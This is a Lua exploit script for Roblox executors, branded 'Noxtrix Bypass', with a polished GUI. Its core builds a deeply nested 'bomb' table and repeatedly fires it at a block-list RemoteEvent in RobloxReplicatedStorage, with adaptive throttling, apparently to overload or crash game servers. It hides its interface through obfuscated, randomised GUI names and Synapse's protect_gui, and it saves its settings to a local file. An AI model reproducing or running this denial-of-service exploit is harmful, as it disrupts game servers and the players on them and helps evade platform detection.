local Services = {
    Players = game:GetService("Players"),
    UIS = game:GetService("UserInputService"),
    TS = game:GetService("TweenService"),
    CoreGui = game:GetService("CoreGui"),
    RunService = game:GetService("RunService"),
    HttpService = game:GetService("HttpService")
}
local CONFIG = {
    VERSION = "2.1.0",
    MAX_POWER = 150000,
    MIN_POWER = 10000,
    STEP = 1000,
    DEFAULT_DELAY = 0.125,
    MAX_DELAY = 0.5,
    MIN_DELAY = 0.05,
    DEPTH = 186,
    GUI_NAME = string.char(65,100,97,112,116) .. "UI_" .. tostring(math.random(1000,9999)),
    REMOTE_NAMES = {
        "SetPlayerBlockList",
        "UpdatePlayerBlockList",
        "SetBlockList",
        "UpdateBlockList"
    }
}
local State = {
    running = false,
    mode = "PC",
    power = { PC = 72000, Mobile = 72000 },
    keybind = "C",
    spamDelay = 0.125,
    uptime = 0,
    thread = nil,
    bomb = nil,
    remote = nil,
    gui = nil,
    connections = {}
}
local FileSystem = {}
function FileSystem:safeWrite(filename, data)
    if not writefile then return false end
    local success = pcall(function()
        -- Validate JSON before writing
        local encoded = Services.HttpService:JSONEncode(data)
        if #encoded > 100000 then error("Config too large") end
        writefile(filename, encoded)
    end)
    return success
end
function FileSystem:safeRead(filename)
    if not (isfile and isfile(filename)) then return nil end
    local success, result = pcall(function()
        local content = readfile(filename)
        if #content > 100000 then error("File too large") end
        return Services.HttpService:JSONDecode(content)
    end)
    return success and result or nil
end
local BombBuilder = {}
function BombBuilder:build(power)
    local main = {}
    local spam = {{}}
    local depth = CONFIG.DEPTH
    -- Build nested structure
    local current = spam[1]
    for _ = 1, depth do
        local next = {}
        table.insert(current, next)
        current = next
    end
    -- Calculate repetitions with overflow protection
    local maxRep = math.min(math.floor(power / (depth + 2)), 10000)
    for _ = 1, maxRep do
        table.insert(main, spam)
    end
    -- Force garbage collection hint
    setmetatable(main, {__mode = "v"})
    return main
end
function BombBuilder:destroy(bomb)
    if not bomb then return end
    -- Clear references to help GC
    for i = 1, #bomb do
        bomb[i] = nil
    end
end
local RemoteFinder = {}
function RemoteFinder:find()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs(CONFIG.REMOTE_NAMES) do
        local remote = rrs:FindFirstChild(name)
        if remote and remote:IsA("RemoteEvent") then
            return remote
        end
    end
    -- Dynamic scan if named remotes fail
    for _, child in ipairs(rrs:GetChildren()) do
        if child:IsA("RemoteEvent") and child.Name:find("Block") then
            return child
        end
    end
    return nil
end
local UI = {}
UI.__index = UI
function UI.new()
    local self = setmetatable({}, UI)
    self:build()
    return self
end
function UI:build()
    -- Parent selection with fallback chain
    local parent = self:findParent()
    if not parent then
        warn("[Noxtrix] No valid GUI parent found")
        return
    end
    -- Main container
    self.gui = Instance.new("ScreenGui")
    self.gui.Name = CONFIG.GUI_NAME
    self.gui.ResetOnSpawn = false
    self.gui.IgnoreGuiInset = true
    self.gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    self.gui.DisplayOrder = math.random(50000, 99999)
    self.gui.Parent = parent
    -- Build components
    self:buildMainFrame()
    self:buildHeader()
    self:buildTabs()
    self:buildStats()
    self:buildPowerControl()
    self:buildKeybind()
    self:buildToggle()
    self:buildFooter()
    self:setupDrag()
    State.gui = self.gui
end
function UI:findParent()
    local lp = Services.Players.LocalPlayer
    if not lp then return nil end
    local pgui = lp:WaitForChild("PlayerGui", 5)
    if pgui then return pgui end
    -- Synapse/Executor protection
    if syn and syn.protect_gui then
        local sg = Instance.new("ScreenGui")
        syn.protect_gui(sg)
        sg.Parent = Services.CoreGui
        return sg
    end
    return Services.CoreGui
end
function UI:buildMainFrame()
    self.main = Instance.new("Frame")
    self.main.Name = "Main"
    self.main.Size = UDim2.new(0, 250, 0, 300)
    self.main.Position = UDim2.new(0.5, -125, 0.5, -150)
    self.main.BackgroundColor3 = Color3.fromRGB(9, 4, 13)
    self.main.BorderSizePixel = 0
    self.main.Active = true
    self.main.Parent = self.gui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 14)
    corner.Parent = self.main
    -- Gradient background
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 30, 55)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(2, 12, 25))
    })
    grad.Rotation = 140
    grad.Parent = self.main
end
function UI:buildHeader()
    local hdr = Instance.new("Frame")
    hdr.Size = UDim2.new(1, 0, 0, 44)
    hdr.BackgroundTransparency = 1
    hdr.Parent = self.main
    -- Logo
    local logo = Instance.new("Frame")
    logo.Size = UDim2.new(0, 28, 0, 28)
    logo.Position = UDim2.new(0, 8, 0, 8)
    logo.BackgroundColor3 = Color3.fromRGB(0, 110, 190)
    logo.Parent = hdr
    Instance.new("UICorner", logo).CornerRadius = UDim.new(1, 0)
    -- Title
    local title = Instance.new("TextLabel")
    title.Text = "NOXTRIX BYPASS"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 13
    title.TextColor3 = Color3.fromRGB(120, 220, 255)
    title.Position = UDim2.new(0, 44, 0, 7)
    title.Size = UDim2.new(0, 160, 0, 16)
    title.BackgroundTransparency = 1
    title.Parent = hdr
    -- Close button
    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 20, 0, 20)
    close.Position = UDim2.new(1, -26, 0, 8)
    close.BackgroundColor3 = Color3.fromRGB(5, 25, 45)
    close.Text = "×"
    close.TextColor3 = Color3.fromRGB(70, 130, 170)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 14
    close.Parent = hdr
    close.MouseButton1Click:Connect(function()
        self:hide()
    end)
end
function UI:buildTabs()
    local tabBg = Instance.new("Frame")
    tabBg.Size = UDim2.new(1, -16, 0, 30)
    tabBg.Position = UDim2.new(0, 8, 0, 48)
    tabBg.BackgroundColor3 = Color3.fromRGB(5, 25, 45)
    tabBg.Parent = self.main
    Instance.new("UICorner", tabBg).CornerRadius = UDim.new(0, 8)
    self.btnPC = self:createTab(tabBg, "PC", 0, true)
    self.btnMobile = self:createTab(tabBg, "MOBILE", 0.5, false)
    self.btnPC.MouseButton1Click:Connect(function() self:setMode("PC") end)
    self.btnMobile.MouseButton1Click:Connect(function() self:setMode("Mobile") end)
end
function UI:createTab(parent, text, xScale, active)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.5, -3, 1, -4)
    btn.Position = UDim2.new(xScale, xScale == 0 and 2 or 1, 0, 2)
    btn.BackgroundColor3 = active and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(5, 25, 45)
    btn.BackgroundTransparency = active and 0 or 1
    btn.Text = text
    btn.TextColor3 = active and Color3.fromRGB(235, 250, 255) or Color3.fromRGB(70, 130, 170)
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 11
    btn.Parent = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    return btn
end
function UI:buildStats()
    local y = 82
    local h = 54
    local w = 74
    local gap = 4
    self.statPower = self:createStatCard(8, y, w, "POWER", "72K")
    self.statStatus = self:createStatCard(8 + w + gap, y, w, "STATUS", "IDLE")
    self.statUptime = self:createStatCard(8 + (w + gap) * 2, y, w + 2, "UPTIME", "00:00")
end
function UI:createStatCard(x, y, w, label, value)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, w, 0, 54)
    card.Position = UDim2.new(0, x, 0, y)
    card.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
    card.Parent = self.main
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
    local val = Instance.new("TextLabel")
    val.Text = value
    val.Font = Enum.Font.GothamBlack
    val.TextSize = 15
    val.TextColor3 = Color3.fromRGB(0, 170, 255)
    val.Size = UDim2.new(1, 0, 0, 22)
    val.Position = UDim2.new(0, 0, 0, 12)
    val.BackgroundTransparency = 1
    val.Parent = card
    local cap = Instance.new("TextLabel")
    cap.Text = label
    cap.Font = Enum.Font.GothamBold
    cap.TextSize = 7
    cap.TextColor3 = Color3.fromRGB(70, 130, 170)
    cap.Size = UDim2.new(1, 0, 0, 10)
    cap.Position = UDim2.new(0, 0, 1, -13)
    cap.BackgroundTransparency = 1
    cap.Parent = card
    return {frame = card, value = val, label = cap}
end
function UI:buildPowerControl()
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -16, 0, 38)
    row.Position = UDim2.new(0, 8, 0, 156)
    row.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
    row.Parent = self.main
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)
    -- Minus
    local minus = Instance.new("TextButton")
    minus.Size = UDim2.new(0, 30, 0, 28)
    minus.Position = UDim2.new(0, 4, 0.5, -14)
    minus.BackgroundColor3 = Color3.fromRGB(5, 25, 45)
    minus.Text = "−"
    minus.TextColor3 = Color3.fromRGB(120, 220, 255)
    minus.Font = Enum.Font.GothamBlack
    minus.TextSize = 16
    minus.Parent = row
    -- Value
    self.powerLabel = Instance.new("TextLabel")
    self.powerLabel.Text = "72000"
    self.powerLabel.Font = Enum.Font.GothamBlack
    self.powerLabel.TextSize = 18
    self.powerLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
    self.powerLabel.Size = UDim2.new(1, -76, 1, 0)
    self.powerLabel.Position = UDim2.new(0, 38, 0, 0)
    self.powerLabel.BackgroundTransparency = 1
    self.powerLabel.Parent = row
    -- Plus
    local plus = Instance.new("TextButton")
    plus.Size = UDim2.new(0, 30, 0, 28)
    plus.Position = UDim2.new(1, -34, 0.5, -14)
    plus.BackgroundColor3 = Color3.fromRGB(5, 25, 45)
    plus.Text = "+"
    plus.TextColor3 = Color3.fromRGB(120, 220, 255)
    plus.Font = Enum.Font.GothamBlack
    plus.TextSize = 16
    plus.Parent = row
    minus.MouseButton1Click:Connect(function() self:adjustPower(-CONFIG.STEP) end)
    plus.MouseButton1Click:Connect(function() self:adjustPower(CONFIG.STEP) end)
end
function UI:buildKeybind()
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -16, 0, 30)
    row.Position = UDim2.new(0, 8, 0, 202)
    row.BackgroundTransparency = 1
    row.Parent = self.main
    local badge = Instance.new("Frame")
    badge.Size = UDim2.new(0, 56, 0, 20)
    badge.Position = UDim2.new(1, -120, 0, 5)
    badge.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
    badge.Parent = row
    Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 6)
    self.keybindLabel = Instance.new("TextLabel")
    self.keybindLabel.Text = "[C]"
    self.keybindLabel.Font = Enum.Font.GothamBlack
    self.keybindLabel.TextSize = 11
    self.keybindLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
    self.keybindLabel.Size = UDim2.new(1, 0, 1, 0)
    self.keybindLabel.BackgroundTransparency = 1
    self.keybindLabel.Parent = badge
    local edit = Instance.new("TextButton")
    edit.Size = UDim2.new(0, 48, 0, 20)
    edit.Position = UDim2.new(1, -50, 0.5, -10)
    edit.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
    edit.Text = "✎ EDIT"
    edit.TextColor3 = Color3.fromRGB(70, 130, 170)
    edit.Font = Enum.Font.GothamBold
    edit.TextSize = 8
    edit.Parent = row
    edit.MouseButton1Click:Connect(function()
        self:listeningForKeybind(true)
    end)
end
function UI:buildToggle()
    self.engRow = Instance.new("Frame")
    self.engRow.Size = UDim2.new(1, -16, 0, 44)
    self.engRow.Position = UDim2.new(0, 8, 0, 240)
    self.engRow.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
    self.engRow.Parent = self.main
    Instance.new("UICorner", self.engRow).CornerRadius = UDim.new(0, 10)
    local title = Instance.new("TextLabel")
    title.Text = "ENGAGE BYPASS"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 12
    title.TextColor3 = Color3.fromRGB(235, 250, 255)
    title.Size = UDim2.new(1, -64, 0, 18)
    title.Position = UDim2.new(0, 12, 0, 6)
    title.BackgroundTransparency = 1
    title.Parent = self.engRow
    local sub = Instance.new("TextLabel")
    sub.Text = "tap to activate"
    sub.Font = Enum.Font.Gotham
    sub.TextSize = 8
    sub.TextColor3 = Color3.fromRGB(70, 130, 170)
    sub.Size = UDim2.new(1, -64, 0, 14)
    sub.Position = UDim2.new(0, 12, 0, 24)
    sub.BackgroundTransparency = 1
    sub.Parent = self.engRow
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = self.engRow
    -- Pill toggle
    local track = Instance.new("Frame")
    track.Size = UDim2.new(0, 42, 0, 22)
    track.Position = UDim2.new(1, -52, 0.5, -11)
    track.BackgroundColor3 = Color3.fromRGB(5, 25, 45)
    track.Parent = self.engRow
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
    self.pillDot = Instance.new("Frame")
    self.pillDot.Size = UDim2.new(0, 18, 0, 18)
    self.pillDot.Position = UDim2.new(0, 2, 0, 2)
    self.pillDot.BackgroundColor3 = Color3.fromRGB(55, 110, 150)
    self.pillDot.Parent = track
    Instance.new("UICorner", self.pillDot).CornerRadius = UDim.new(1, 0)
    btn.MouseButton1Click:Connect(function() self:toggle() end)
end
function UI:buildFooter()
    local disc = Instance.new("TextLabel")
    disc.Text = "discord.gg/adaptt"
    disc.Font = Enum.Font.GothamBold
    disc.TextSize = 9
    disc.TextColor3 = Color3.fromRGB(255, 255, 255)
    disc.Size = UDim2.new(1, 0, 0, 14)
    disc.Position = UDim2.new(0, 0, 0, 284)
    disc.BackgroundTransparency = 1
    disc.Parent = self.main
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 240, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
    })
    grad.Parent = disc
    -- Animate gradient
    task.spawn(function()
        local t = 0
        while disc and disc.Parent do
            t = t + 0.025
            grad.Offset = Vector2.new(math.sin(t) * 0.5, 0)
            task.wait(0.04)
        end
    end)
end
function UI:setupDrag()
    local dragging, dragInput, startPos, startMouse
    local main = self.main
    main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
           input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = main.Position
            startMouse = input.Position
        end
    end)
    Services.UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
                        input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - startMouse
            main.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    Services.UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
           input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end
function UI:setMode(mode)
    State.mode = mode
    local power = State.power[mode]
    -- Update tab visuals
    local activeColor = Color3.fromRGB(0, 170, 255)
    local inactiveColor = Color3.fromRGB(5, 25, 45)
    Services.TS:Create(self.btnPC, TweenInfo.new(0.14), {
        BackgroundColor3 = mode == "PC" and activeColor or inactiveColor,
        BackgroundTransparency = mode == "PC" and 0 or 1,
        TextColor3 = mode == "PC" and Color3.fromRGB(235, 250, 255) or Color3.fromRGB(70, 130, 170)
    }):Play()
    Services.TS:Create(self.btnMobile, TweenInfo.new(0.14), {
        BackgroundColor3 = mode == "Mobile" and activeColor or inactiveColor,
        BackgroundTransparency = mode == "Mobile" and 0 or 1,
        TextColor3 = mode == "Mobile" and Color3.fromRGB(235, 250, 255) or Color3.fromRGB(70, 130, 170)
    }):Play()
    self:updatePowerDisplay(power)
end
function UI:adjustPower(delta)
    local current = State.power[State.mode]
    local maxP = State.mode == "PC" and CONFIG.MAX_POWER or 100000
    local newPower = math.clamp(current + delta, CONFIG.MIN_POWER, maxP)
    State.power[State.mode] = newPower
    self:updatePowerDisplay(newPower)
    if State.running then
        self:restartSpam()
    end
    FileSystem:safeWrite("NoxtrixConfig.json", {
        mode = State.mode,
        power = State.power,
        keybind = State.keybind,
        delay = State.spamDelay
    })
end
function UI:updatePowerDisplay(power)
    self.powerLabel.Text = tostring(power)
    self.statPower.value.Text = power >= 1000 and math.floor(power / 1000) .. "K" or tostring(power)
end
function UI:listeningForKeybind(active)
    State.listening = active
    self.keybindLabel.Text = active and "[...]" or "[" .. State.keybind .. "]"
    self.keybindLabel.TextColor3 = active and Color3.fromRGB(100, 220, 255) or Color3.fromRGB(0, 170, 255)
end
function UI:toggle()
    State.running = not State.running
    if State.running then
        -- Activate
        self.engRow.BackgroundColor3 = Color3.fromRGB(0, 65, 105)
        self.statStatus.value.Text = "ACTIVE"
        self.statStatus.value.TextColor3 = Color3.fromRGB(120, 220, 255)
        Services.TS:Create(self.pillDot, TweenInfo.new(0.18), {
            Position = UDim2.new(1, -20, 0, 2),
            BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        }):Play()
        State.uptime = tick()
        self:startSpam()
    else
        -- Deactivate
        self.engRow.BackgroundColor3 = Color3.fromRGB(5, 20, 35)
        self.statStatus.value.Text = "IDLE"
        self.statStatus.value.TextColor3 = Color3.fromRGB(55, 110, 150)
        Services.TS:Create(self.pillDot, TweenInfo.new(0.18), {
            Position = UDim2.new(0, 2, 0, 2),
            BackgroundColor3 = Color3.fromRGB(55, 110, 150)
        }):Play()
        self:stopSpam()
        self.statUptime.value.Text = "00:00"
    end
end
function UI:startSpam()
    -- Find remote if not cached
    if not State.remote then
        State.remote = RemoteFinder:find()
        if not State.remote then
            warn("[Noxtrix] Remote not found")
            State.running = false
            self:toggle()
            return
        end
    end
    -- Build bomb
    State.bomb = BombBuilder:build(State.power[State.mode])
    -- Adaptive throttling
    local delay = State.spamDelay
    local lastTime = tick()
    local frameCount = 0
    State.thread = task.spawn(function()
        while State.running do
            local success = pcall(function()
                State.remote:FireServer(State.bomb)
            end)
            if not success then
                -- Back off on errors
                delay = math.min(delay * 1.5, CONFIG.MAX_DELAY)
            else
                -- Gradually optimize
                delay = math.max(delay * 0.995, CONFIG.MIN_DELAY)
            end
            task.wait(delay)
        end
    end)
    -- Uptime updater
    task.spawn(function()
        while State.running do
            local elapsed = math.floor(tick() - State.uptime)
            local mm = math.floor(elapsed / 60)
            local ss = elapsed % 60
            self.statUptime.value.Text = string.format("%02d:%02d", mm, ss)
            task.wait(1)
        end
    end)
end
function UI:stopSpam()
    if State.thread then
        pcall(function() task.cancel(State.thread) end)
        State.thread = nil
    end
    if State.bomb then
        BombBuilder:destroy(State.bomb)
        State.bomb = nil
    end
end
function UI:restartSpam()
    self:stopSpam()
    if State.running then
        self:startSpam()
    end
end
function UI:hide()
    Services.TS:Create(self.main, TweenInfo.new(0.18), {BackgroundTransparency = 1}):Play()
    task.delay(0.18, function()
        self.main.Visible = false
        self.main.BackgroundTransparency = 0
    end)
end
function UI:show()
    self.main.Visible = true
    Services.TS:Create(self.main, TweenInfo.new(0.18), {BackgroundTransparency = 0}):Play()
end
function UI:setupInput()
    Services.UIS.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if State.listening and input.UserInputType == Enum.UserInputType.Keyboard then
            State.keybind = input.KeyCode.Name
            self:listeningForKeybind(false)
            FileSystem:safeWrite("NoxtrixConfig.json", {
                mode = State.mode,
                power = State.power,
                keybind = State.keybind,
                delay = State.spamDelay
            })
            return
        end
        if input.UserInputType == Enum.UserInputType.Keyboard and 
           input.KeyCode.Name == State.keybind then
            self:toggle()
        end
    end)
end
function UI:init()
    -- Load config
    local saved = FileSystem:safeRead("NoxtrixConfig.json")
    if saved then
        if saved.mode then State.mode = saved.mode end
        if saved.power then State.power = saved.power end
        if saved.keybind then State.keybind = saved.keybind end
        if saved.delay then State.spamDelay = saved.delay end
    end
    self:setMode(State.mode)
    self:setupInput()
    print("[Noxtrix] Initialized v" .. CONFIG.VERSION)
end
task.wait(1) -- Ensure game is loaded
local ui = UI.new()
if ui then
    ui:init()
end